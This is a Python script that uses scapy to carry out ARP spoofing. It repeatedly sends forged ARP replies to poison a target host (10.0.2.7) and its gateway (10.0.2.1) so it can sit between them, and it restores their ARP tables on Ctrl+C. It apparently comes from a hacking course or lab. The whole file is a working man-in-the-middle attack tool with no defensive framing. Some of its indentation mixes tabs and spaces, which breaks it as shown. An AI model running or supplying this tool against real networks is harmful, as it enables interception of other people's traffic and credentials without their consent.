import scapy.all as scapy
import time

import sys
def get_mac(ip):
	
	arp_header = scapy.ARP(pdst = ip)
	ether_header = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_packet = ether_header/arp_header
	answered_list = scapy.srp(arp_request_packet,timeout=1,verbose=False)[0]
	
	return answered_list[0][1].hwsrc

	

def spoof(target_ip,spoof_ip):
	target_mac=get_mac(target_ip)
	packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
	scapy.send(packet)

def restore(destination_ip,source_ip):
	destination_mac=get_mac(destination_ip)
	source_mac=get_mac(source_ip)
	packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip)
    scapy.send(packet,count=4,verbose=False)

gateway_ip="10.0.2.1"
target_ip="10.0.2.7"
try:
	send_packets_counts=0
	while True:
		spoof(target_ip,gateway_ip)
		spoof(gateway_ip,target_ip)
		send_packets_counts=send_packets_counts + 2
		print("\r[+] Sent two Packets " + str(send_packets_counts)),
		sys.stdout.flush()
		time.sleep(2)
 
except KeyboardInterrupt:

	print("[+] Detected CTRL + C ....Resetting ARP tables Please Wait ...")

	
	
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)
	
	

	


	









